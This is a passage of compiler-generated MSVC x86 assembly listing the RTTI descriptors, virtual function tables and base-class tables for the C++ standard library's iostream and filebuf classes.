rdata$r	SEGMENT
??_R4?$basic_fstream@DU?$char_traits@D@std@@@std@@6B@ DD 00H ; std::basic_fstream<char,std::char_traits<char> >::`RTTI Complete Object Locator'
	DD	078H
	DD	04H
	DD	FLAT:??_R0?AV?$basic_fstream@DU?$char_traits@D@std@@@std@@@8
	DD	FLAT:??_R3?$basic_fstream@DU?$char_traits@D@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@?$basic_filebuf@DU?$char_traits@D@std@@@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@?$basic_filebuf@DU?$char_traits@D@std@@@std@@8 DD FLAT:??_R0?AV?$basic_filebuf@DU?$char_traits@D@std@@@std@@@8 ; std::basic_filebuf<char,std::char_traits<char> >::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	01H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3?$basic_filebuf@DU?$char_traits@D@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R2?$basic_filebuf@DU?$char_traits@D@std@@@std@@8
rdata$r	SEGMENT
??_R2?$basic_filebuf@DU?$char_traits@D@std@@@std@@8 DD FLAT:??_R1A@?0A@EA@?$basic_filebuf@DU?$char_traits@D@std@@@std@@8 ; std::basic_filebuf<char,std::char_traits<char> >::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@?$basic_streambuf@DU?$char_traits@D@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R3?$basic_filebuf@DU?$char_traits@D@std@@@std@@8
rdata$r	SEGMENT
??_R3?$basic_filebuf@DU?$char_traits@D@std@@@std@@8 DD 00H ; std::basic_filebuf<char,std::char_traits<char> >::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	02H
	DD	FLAT:??_R2?$basic_filebuf@DU?$char_traits@D@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV?$basic_filebuf@DU?$char_traits@D@std@@@std@@@8
data$rs	SEGMENT
??_R0?AV?$basic_filebuf@DU?$char_traits@D@std@@@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::basic_filebuf<char,std::char_traits<char> > `RTTI Type Descriptor'
	DD	00H
	DB	'.?AV?$basic_filebuf@DU?$char_traits@D@std@@@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4?$basic_filebuf@DU?$char_traits@D@std@@@std@@6B@
rdata$r	SEGMENT
??_R4?$basic_filebuf@DU?$char_traits@D@std@@@std@@6B@ DD 00H ; std::basic_filebuf<char,std::char_traits<char> >::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AV?$basic_filebuf@DU?$char_traits@D@std@@@std@@@8
	DD	FLAT:??_R3?$basic_filebuf@DU?$char_traits@D@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R1BA@?0A@EA@?$basic_ostream@DU?$char_traits@D@std@@@std@@8
rdata$r	SEGMENT
??_R1BA@?0A@EA@?$basic_ostream@DU?$char_traits@D@std@@@std@@8 DD FLAT:??_R0?AV?$basic_ostream@DU?$char_traits@D@std@@@std@@@8 ; std::basic_ostream<char,std::char_traits<char> >::`RTTI Base Class Descriptor at (16,-1,0,64)'
	DD	03H
	DD	010H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3?$basic_ostream@DU?$char_traits@D@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@?$basic_iostream@DU?$char_traits@D@std@@@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@?$basic_iostream@DU?$char_traits@D@std@@@std@@8 DD FLAT:??_R0?AV?$basic_iostream@DU?$char_traits@D@std@@@std@@@8 ; std::basic_iostream<char,std::char_traits<char> >::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	08H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3?$basic_iostream@DU?$char_traits@D@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R2?$basic_iostream@DU?$char_traits@D@std@@@std@@8
rdata$r	SEGMENT
??_R2?$basic_iostream@DU?$char_traits@D@std@@@std@@8 DD FLAT:??_R1A@?0A@EA@?$basic_iostream@DU?$char_traits@D@std@@@std@@8 ; std::basic_iostream<char,std::char_traits<char> >::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@?$basic_istream@DU?$char_traits@D@std@@@std@@8
	DD	FLAT:??_R1A@A@3FA@?$basic_ios@DU?$char_traits@D@std@@@std@@8
	DD	FLAT:??_R1A@A@3EA@ios_base@std@@8
	DD	FLAT:??_R17A@3EA@?$_Iosb@H@std@@8
	DD	FLAT:??_R1BA@?0A@EA@?$basic_ostream@DU?$char_traits@D@std@@@std@@8
	DD	FLAT:??_R1A@A@3FA@?$basic_ios@DU?$char_traits@D@std@@@std@@8
	DD	FLAT:??_R1A@A@3EA@ios_base@std@@8
	DD	FLAT:??_R17A@3EA@?$_Iosb@H@std@@8
rdata$r	ENDS
;	COMDAT ??_R3?$basic_iostream@DU?$char_traits@D@std@@@std@@8
rdata$r	SEGMENT
??_R3?$basic_iostream@DU?$char_traits@D@std@@@std@@8 DD 00H ; std::basic_iostream<char,std::char_traits<char> >::`RTTI Class Hierarchy Descriptor'
	DD	03H
	DD	09H
	DD	FLAT:??_R2?$basic_iostream@DU?$char_traits@D@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV?$basic_iostream@DU?$char_traits@D@std@@@std@@@8
data$rs	SEGMENT
??_R0?AV?$basic_iostream@DU?$char_traits@D@std@@@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::basic_iostream<char,std::char_traits<char> > `RTTI Type Descriptor'
	DD	00H
	DB	'.?AV?$basic_iostream@DU?$char_traits@D@std@@@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4?$basic_iostream@DU?$char_traits@D@std@@@std@@6B@
rdata$r	SEGMENT
??_R4?$basic_iostream@DU?$char_traits@D@std@@@std@@6B@ DD 00H ; std::basic_iostream<char,std::char_traits<char> >::`RTTI Complete Object Locator'
	DD	020H
	DD	04H
	DD	FLAT:??_R0?AV?$basic_iostream@DU?$char_traits@D@std@@@std@@@8
	DD	FLAT:??_R3?$basic_iostream@DU?$char_traits@D@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@?$basic_ostream@DU?$char_traits@D@std@@@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@?$basic_ostream@DU?$char_traits@D@std@@@std@@8 DD FLAT:??_R0?AV?$basic_ostream@DU?$char_traits@D@std@@@std@@@8 ; std::basic_ostream<char,std::char_traits<char> >::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	03H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3?$basic_ostream@DU?$char_traits@D@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R2?$basic_ostream@DU?$char_traits@D@std@@@std@@8
rdata$r	SEGMENT
??_R2?$basic_ostream@DU?$char_traits@D@std@@@std@@8 DD FLAT:??_R1A@?0A@EA@?$basic_ostream@DU?$char_traits@D@std@@@std@@8 ; std::basic_ostream<char,std::char_traits<char> >::`RTTI Base Class Array'
	DD	FLAT:??_R1A@A@3FA@?$basic_ios@DU?$char_traits@D@std@@@std@@8
	DD	FLAT:??_R1A@A@3EA@ios_base@std@@8
	DD	FLAT:??_R17A@3EA@?$_Iosb@H@std@@8
rdata$r	ENDS
;	COMDAT ??_R3?$basic_ostream@DU?$char_traits@D@std@@@std@@8
rdata$r	SEGMENT
??_R3?$basic_ostream@DU?$char_traits@D@std@@@std@@8 DD 00H ; std::basic_ostream<char,std::char_traits<char> >::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	04H
	DD	FLAT:??_R2?$basic_ostream@DU?$char_traits@D@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV?$basic_ostream@DU?$char_traits@D@std@@@std@@@8
data$rs	SEGMENT
??_R0?AV?$basic_ostream@DU?$char_traits@D@std@@@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::basic_ostream<char,std::char_traits<char> > `RTTI Type Descriptor'
	DD	00H
	DB	'.?AV?$basic_ostream@DU?$char_traits@D@std@@@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4?$basic_ostream@DU?$char_traits@D@std@@@std@@6B@
rdata$r	SEGMENT
??_R4?$basic_ostream@DU?$char_traits@D@std@@@std@@6B@ DD 00H ; std::basic_ostream<char,std::char_traits<char> >::`RTTI Complete Object Locator'
	DD	08H
	DD	04H
	DD	FLAT:??_R0?AV?$basic_ostream@DU?$char_traits@D@std@@@std@@@8
	DD	FLAT:??_R3?$basic_ostream@DU?$char_traits@D@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R17A@3EA@?$_Iosb@H@std@@8
rdata$r	SEGMENT
??_R17A@3EA@?$_Iosb@H@std@@8 DD FLAT:??_R0?AV?$_Iosb@H@std@@@8 ; std::_Iosb<int>::`RTTI Base Class Descriptor at (8,0,4,64)'
	DD	00H
	DD	08H
	DD	00H
	DD	04H
	DD	040H
	DD	FLAT:??_R3?$_Iosb@H@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@A@3EA@ios_base@std@@8
rdata$r	SEGMENT
??_R1A@A@3EA@ios_base@std@@8 DD FLAT:??_R0?AVios_base@std@@@8 ; std::ios_base::`RTTI Base Class Descriptor at (0,0,4,64)'
	DD	01H
	DD	00H
	DD	00H
	DD	04H
	DD	040H
	DD	FLAT:??_R3ios_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@A@3FA@?$basic_ios@DU?$char_traits@D@std@@@std@@8
rdata$r	SEGMENT
??_R1A@A@3FA@?$basic_ios@DU?$char_traits@D@std@@@std@@8 DD FLAT:??_R0?AV?$basic_ios@DU?$char_traits@D@std@@@std@@@8 ; std::basic_ios<char,std::char_traits<char> >::`RTTI Base Class Descriptor at (0,0,4,80)'
	DD	02H
	DD	00H
	DD	00H
	DD	04H
	DD	050H
	DD	FLAT:??_R3?$basic_ios@DU?$char_traits@D@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@?$basic_istream@DU?$char_traits@D@std@@@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@?$basic_istream@DU?$char_traits@D@std@@@std@@8 DD FLAT:??_R0?AV?$basic_istream@DU?$char_traits@D@std@@@std@@@8 ; std::basic_istream<char,std::char_traits<char> >::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	03H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3?$basic_istream@DU?$char_traits@D@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R2?$basic_istream@DU?$char_traits@D@std@@@std@@8
rdata$r	SEGMENT
??_R2?$basic_istream@DU?$char_traits@D@std@@@std@@8 DD FLAT:??_R1A@?0A@EA@?$basic_istream@DU?$char_traits@D@std@@@std@@8 ; std::basic_istream<char,std::char_traits<char> >::`RTTI Base Class Array'
	DD	FLAT:??_R1A@A@3FA@?$basic_ios@DU?$char_traits@D@std@@@std@@8
	DD	FLAT:??_R1A@A@3EA@ios_base@std@@8
	DD	FLAT:??_R17A@3EA@?$_Iosb@H@std@@8
rdata$r	ENDS
;	COMDAT ??_R3?$basic_istream@DU?$char_traits@D@std@@@std@@8
rdata$r	SEGMENT
??_R3?$basic_istream@DU?$char_traits@D@std@@@std@@8 DD 00H ; std::basic_istream<char,std::char_traits<char> >::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	04H
	DD	FLAT:??_R2?$basic_istream@DU?$char_traits@D@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV?$basic_istream@DU?$char_traits@D@std@@@std@@@8
data$rs	SEGMENT
??_R0?AV?$basic_istream@DU?$char_traits@D@std@@@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::basic_istream<char,std::char_traits<char> > `RTTI Type Descriptor'
	DD	00H
	DB	'.?AV?$basic_istream@DU?$char_traits@D@std@@@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4?$basic_istream@DU?$char_traits@D@std@@@std@@6B@
rdata$r	SEGMENT
??_R4?$basic_istream@DU?$char_traits@D@std@@@std@@6B@ DD 00H ; std::basic_istream<char,std::char_traits<char> >::`RTTI Complete Object Locator'
	DD	018H
	DD	04H
	DD	FLAT:??_R0?AV?$basic_istream@DU?$char_traits@D@std@@@std@@@8
	DD	FLAT:??_R3?$basic_istream@DU?$char_traits@D@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@?$basic_streambuf@DU?$char_traits@D@std@@@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@?$basic_streambuf@DU?$char_traits@D@std@@@std@@8 DD FLAT:??_R0?AV?$basic_streambuf@DU?$char_traits@D@std@@@std@@@8 ; std::basic_streambuf<char,std::char_traits<char> >::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	00H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3?$basic_streambuf@DU?$char_traits@D@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R2?$basic_streambuf@DU?$char_traits@D@std@@@std@@8
rdata$r	SEGMENT
??_R2?$basic_streambuf@DU?$char_traits@D@std@@@std@@8 DD FLAT:??_R1A@?0A@EA@?$basic_streambuf@DU?$char_traits@D@std@@@std@@8 ; std::basic_streambuf<char,std::char_traits<char> >::`RTTI Base Class Array'
rdata$r	ENDS
;	COMDAT ??_R3?$basic_streambuf@DU?$char_traits@D@std@@@std@@8
rdata$r	SEGMENT
??_R3?$basic_streambuf@DU?$char_traits@D@std@@@std@@8 DD 00H ; std::basic_streambuf<char,std::char_traits<char> >::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	01H
	DD	FLAT:??_R2?$basic_streambuf@DU?$char_traits@D@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV?$basic_streambuf@DU?$char_traits@D@std@@@std@@@8
data$rs	SEGMENT
??_R0?AV?$basic_streambuf@DU?$char_traits@D@std@@@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::basic_streambuf<char,std::char_traits<char> > `RTTI Type Descriptor'
	DD	00H
	DB	'.?AV?$basic_streambuf@DU?$char_traits@D@std@@@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4?$basic_streambuf@DU?$char_traits@D@std@@@std@@6B@
rdata$r	SEGMENT
??_R4?$basic_streambuf@DU?$char_traits@D@std@@@std@@6B@ DD 00H ; std::basic_streambuf<char,std::char_traits<char> >::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AV?$basic_streambuf@DU?$char_traits@D@std@@@std@@@8
	DD	FLAT:??_R3?$basic_streambuf@DU?$char_traits@D@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@?$basic_ios@DU?$char_traits@D@std@@@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@?$basic_ios@DU?$char_traits@D@std@@@std@@8 DD FLAT:??_R0?AV?$basic_ios@DU?$char_traits@D@std@@@std@@@8 ; std::basic_ios<char,std::char_traits<char> >::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	02H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3?$basic_ios@DU?$char_traits@D@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R2?$basic_ios@DU?$char_traits@D@std@@@std@@8
rdata$r	SEGMENT
??_R2?$basic_ios@DU?$char_traits@D@std@@@std@@8 DD FLAT:??_R1A@?0A@EA@?$basic_ios@DU?$char_traits@D@std@@@std@@8 ; std::basic_ios<char,std::char_traits<char> >::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@ios_base@std@@8
	DD	FLAT:??_R17?0A@EA@?$_Iosb@H@std@@8
rdata$r	ENDS
;	COMDAT ??_R3?$basic_ios@DU?$char_traits@D@std@@@std@@8
rdata$r	SEGMENT
??_R3?$basic_ios@DU?$char_traits@D@std@@@std@@8 DD 00H	; std::basic_ios<char,std::char_traits<char> >::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	03H
	DD	FLAT:??_R2?$basic_ios@DU?$char_traits@D@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV?$basic_ios@DU?$char_traits@D@std@@@std@@@8
data$rs	SEGMENT
??_R0?AV?$basic_ios@DU?$char_traits@D@std@@@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::basic_ios<char,std::char_traits<char> > `RTTI Type Descriptor'
	DD	00H
	DB	'.?AV?$basic_ios@DU?$char_traits@D@std@@@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4?$basic_ios@DU?$char_traits@D@std@@@std@@6B@
rdata$r	SEGMENT
??_R4?$basic_ios@DU?$char_traits@D@std@@@std@@6B@ DD 00H ; std::basic_ios<char,std::char_traits<char> >::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AV?$basic_ios@DU?$char_traits@D@std@@@std@@@8
	DD	FLAT:??_R3?$basic_ios@DU?$char_traits@D@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@?$_Iosb@H@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@?$_Iosb@H@std@@8 DD FLAT:??_R0?AV?$_Iosb@H@std@@@8 ; std::_Iosb<int>::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	00H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3?$_Iosb@H@std@@8
rdata$r	ENDS
;	COMDAT ??_R2?$_Iosb@H@std@@8
rdata$r	SEGMENT
??_R2?$_Iosb@H@std@@8 DD FLAT:??_R1A@?0A@EA@?$_Iosb@H@std@@8 ; std::_Iosb<int>::`RTTI Base Class Array'
rdata$r	ENDS
;	COMDAT ??_R3?$_Iosb@H@std@@8
rdata$r	SEGMENT
??_R3?$_Iosb@H@std@@8 DD 00H				; std::_Iosb<int>::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	01H
	DD	FLAT:??_R2?$_Iosb@H@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV?$_Iosb@H@std@@@8
data$rs	SEGMENT
??_R0?AV?$_Iosb@H@std@@@8 DD FLAT:??_7type_info@@6B@	; std::_Iosb<int> `RTTI Type Descriptor'
	DD	00H
	DB	'.?AV?$_Iosb@H@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R17?0A@EA@?$_Iosb@H@std@@8
rdata$r	SEGMENT
??_R17?0A@EA@?$_Iosb@H@std@@8 DD FLAT:??_R0?AV?$_Iosb@H@std@@@8 ; std::_Iosb<int>::`RTTI Base Class Descriptor at (8,-1,0,64)'
	DD	00H
	DD	08H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3?$_Iosb@H@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@ios_base@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@ios_base@std@@8 DD FLAT:??_R0?AVios_base@std@@@8 ; std::ios_base::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	01H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3ios_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R2ios_base@std@@8
rdata$r	SEGMENT
??_R2ios_base@std@@8 DD FLAT:??_R1A@?0A@EA@ios_base@std@@8 ; std::ios_base::`RTTI Base Class Array'
	DD	FLAT:??_R17?0A@EA@?$_Iosb@H@std@@8
rdata$r	ENDS
;	COMDAT ??_R3ios_base@std@@8
rdata$r	SEGMENT
??_R3ios_base@std@@8 DD 00H				; std::ios_base::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	02H
	DD	FLAT:??_R2ios_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AVios_base@std@@@8
data$rs	SEGMENT
??_R0?AVios_base@std@@@8 DD FLAT:??_7type_info@@6B@	; std::ios_base `RTTI Type Descriptor'
	DD	00H
	DB	'.?AVios_base@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4ios_base@std@@6B@
rdata$r	SEGMENT
??_R4ios_base@std@@6B@ DD 00H				; std::ios_base::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AVios_base@std@@@8
	DD	FLAT:??_R3ios_base@std@@8
rdata$r	ENDS
;	COMDAT ?_Static@?1???$_Immortalize_memcpy_image@V_Iostream_error_category2@std@@@std@@YAABV_Iostream_error_category2@1@XZ@4U?$_Constexpr_immortalize_impl@V_Iostream_error_category2@std@@@1@A
_DATA	SEGMENT
?_Static@?1???$_Immortalize_memcpy_image@V_Iostream_error_category2@std@@@std@@YAABV_Iostream_error_category2@1@XZ@4U?$_Constexpr_immortalize_impl@V_Iostream_error_category2@std@@@1@A DD FLAT:??_7_Iostream_error_category2@std@@6B@ ; `std::_Immortalize_memcpy_image<std::_Iostream_error_category2>'::`2'::_Static
	DD	05H
_DATA	ENDS
;	COMDAT ??_C@_0BI@CFPLBAOH@invalid?5string?5position@
CONST	SEGMENT
??_C@_0BI@CFPLBAOH@invalid?5string?5position@ DB 'invalid string position'
	DB	00H						; `string'
CONST	ENDS
;	COMDAT ??_7?$codecvt@DDU_Mbstatet@@@std@@6B@
CONST	SEGMENT
??_7?$codecvt@DDU_Mbstatet@@@std@@6B@ DD FLAT:??_R4?$codecvt@DDU_Mbstatet@@@std@@6B@ ; std::codecvt<char,char,_Mbstatet>::`vftable'
	DD	FLAT:??_E?$codecvt@DDU_Mbstatet@@@std@@MAEPAXI@Z
	DD	FLAT:?_Incref@facet@locale@std@@UAEXXZ
	DD	FLAT:?_Decref@facet@locale@std@@UAEPAV_Facet_base@3@XZ
	DD	FLAT:?do_always_noconv@?$codecvt@DDU_Mbstatet@@@std@@MBE_NXZ
	DD	FLAT:?do_max_length@codecvt_base@std@@MBEHXZ
	DD	FLAT:?do_encoding@codecvt_base@std@@MBEHXZ
	DD	FLAT:?do_in@?$codecvt@DDU_Mbstatet@@@std@@MBEHAAU_Mbstatet@@PBD1AAPBDPAD3AAPAD@Z
	DD	FLAT:?do_out@?$codecvt@DDU_Mbstatet@@@std@@MBEHAAU_Mbstatet@@PBD1AAPBDPAD3AAPAD@Z
	DD	FLAT:?do_unshift@?$codecvt@DDU_Mbstatet@@@std@@MBEHAAU_Mbstatet@@PAD1AAPAD@Z
	DD	FLAT:?do_length@?$codecvt@DDU_Mbstatet@@@std@@MBEHAAU_Mbstatet@@PBD1I@Z
CONST	ENDS
;	COMDAT ??_8?$basic_fstream@DU?$char_traits@D@std@@@std@@7B?$basic_ostream@DU?$char_traits@D@std@@@1@@
CONST	SEGMENT
??_8?$basic_fstream@DU?$char_traits@D@std@@@std@@7B?$basic_ostream@DU?$char_traits@D@std@@@1@@ DD 00H ; std::basic_fstream<char,std::char_traits<char> >::`vbtable'
	DD	068H
CONST	ENDS
;	COMDAT ??_8?$basic_fstream@DU?$char_traits@D@std@@@std@@7B?$basic_istream@DU?$char_traits@D@std@@@1@@
CONST	SEGMENT
??_8?$basic_fstream@DU?$char_traits@D@std@@@std@@7B?$basic_istream@DU?$char_traits@D@std@@@1@@ DD 00H ; std::basic_fstream<char,std::char_traits<char> >::`vbtable'
	DD	078H
CONST	ENDS
;	COMDAT ??_7?$basic_fstream@DU?$char_traits@D@std@@@std@@6B@
CONST	SEGMENT
??_7?$basic_fstream@DU?$char_traits@D@std@@@std@@6B@ DD FLAT:??_R4?$basic_fstream@DU?$char_traits@D@std@@@std@@6B@ ; std::basic_fstream<char,std::char_traits<char> >::`vftable'
	DD	FLAT:??_E?$basic_fstream@DU?$char_traits@D@std@@@std@@$4PPPPPPPM@A@AEPAXI@Z
CONST	ENDS
;	COMDAT ??_7?$basic_filebuf@DU?$char_traits@D@std@@@std@@6B@
CONST	SEGMENT
??_7?$basic_filebuf@DU?$char_traits@D@std@@@std@@6B@ DD FLAT:??_R4?$basic_filebuf@DU?$char_traits@D@std@@@std@@6B@ ; std::basic_filebuf<char,std::char_traits<char> >::`vftable'
	DD	FLAT:??_E?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAEPAXI@Z
	DD	FLAT:?_Lock@?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAEXXZ
	DD	FLAT:?_Unlock@?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAEXXZ
	DD	FLAT:?overflow@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHH@Z
	DD	FLAT:?pbackfail@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHH@Z
	DD	FLAT:?showmanyc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAE_JXZ
	DD	FLAT:?underflow@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHXZ
	DD	FLAT:?uflow@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHXZ
	DD	FLAT:?xsgetn@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAE_JPAD_J@Z
	DD	FLAT:?xsputn@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAE_JPBD_J@Z
	DD	FLAT:?seekoff@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAE?AV?$fpos@U_Mbstatet@@@2@_JHH@Z
	DD	FLAT:?seekpos@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAE?AV?$fpos@U_Mbstatet@@@2@V32@H@Z
	DD	FLAT:?setbuf@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEPAV?$basic_streambuf@DU?$char_traits@D@std@@@2@PAD_J@Z
	DD	FLAT:?sync@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHXZ
	DD	FLAT:?imbue@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEXABVlocale@2@@Z
CONST	ENDS
;	COMDAT ??_7?$basic_streambuf@DU?$char_traits@D@std@@@std@@6B@
CONST	SEGMENT
??_7?$basic_streambuf@DU?$char_traits@D@std@@@std@@6B@ DD FLAT:??_R4?$basic_streambuf@DU?$char_traits@D@std@@@std@@6B@ ; std::basic_streambuf<char,std::char_traits<char> >::`vftable'
	DD	FLAT:??_E?$basic_streambuf@DU?$char_traits@D@std@@@std@@UAEPAXI@Z
	DD	FLAT:?_Lock@?$basic_streambuf@DU?$char_traits@D@std@@@std@@UAEXXZ
	DD	FLAT:?_Unlock@?$basic_streambuf@DU?$char_traits@D@std@@@std@@UAEXXZ
	DD	FLAT:?overflow@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAEHH@Z
	DD	FLAT:?pbackfail@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAEHH@Z
	DD	FLAT:?showmanyc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAE_JXZ
	DD	FLAT:?underflow@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAEHXZ
	DD	FLAT:?uflow@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAEHXZ
	DD	FLAT:?xsgetn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAE_JPAD_J@Z
	DD	FLAT:?xsputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAE_JPBD_J@Z
	DD	FLAT:?seekoff@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAE?AV?$fpos@U_Mbstatet@@@2@_JHH@Z
	DD	FLAT:?seekpos@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAE?AV?$fpos@U_Mbstatet@@@2@V32@H@Z
	DD	FLAT:?setbuf@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAEPAV12@PAD_J@Z
	DD	FLAT:?sync@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAEHXZ
	DD	FLAT:?imbue@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAEXABVlocale@2@@Z
CONST	ENDS
;	COMDAT ??_8?$basic_iostream@DU?$char_traits@D@std@@@std@@7B?$basic_ostream@DU?$char_traits@D@std@@@1@@
CONST	SEGMENT
??_8?$basic_iostream@DU?$char_traits@D@std@@@std@@7B?$basic_ostream@DU?$char_traits@D@std@@@1@@ DD 00H ; std::basic_iostream<char,std::char_traits<char> >::`vbtable'
	DD	010H
CONST	ENDS
;	COMDAT ??_8?$basic_iostream@DU?$char_traits@D@std@@@std@@7B?$basic_istream@DU?$char_traits@D@std@@@1@@
CONST	SEGMENT
??_8?$basic_iostream@DU?$char_traits@D@std@@@std@@7B?$basic_istream@DU?$char_traits@D@std@@@1@@ DD 00H ; std::basic_iostream<char,std::char_traits<char> >::`vbtable'
	DD	020H
CONST	ENDS
;	COMDAT ??_7?$basic_iostream@DU?$char_traits@D@std@@@std@@6B@
CONST	SEGMENT
??_7?$basic_iostream@DU?$char_traits@D@std@@@std@@6B@ DD FLAT:??_R4?$basic_iostream@DU?$char_traits@D@std@@@std@@6B@ ; std::basic_iostream<char,std::char_traits<char> >::`vftable'
	DD	FLAT:??_E?$basic_iostream@DU?$char_traits@D@std@@@std@@$4PPPPPPPM@A@AEPAXI@Z
CONST	ENDS
;	COMDAT ??_8?$basic_ostream@DU?$char_traits@D@std@@@std@@7B@
CONST	SEGMENT
??_8?$basic_ostream@DU?$char_traits@D@std@@@std@@7B@ DD 00H ; std::basic_ostream<char,std::char_traits<char> >::`vbtable'
	DD	08H
CONST	ENDS
;	COMDAT ??_7?$basic_ostream@DU?$char_traits@D@std@@@std@@6B@
CONST	SEGMENT
??_7?$basic_ostream@DU?$char_traits@D@std@@@std@@6B@ DD FLAT:??_R4?$basic_ostream@DU?$char_traits@D@std@@@std@@6B@ ; std::basic_ostream<char,std::char_traits<char> >::`vftable'
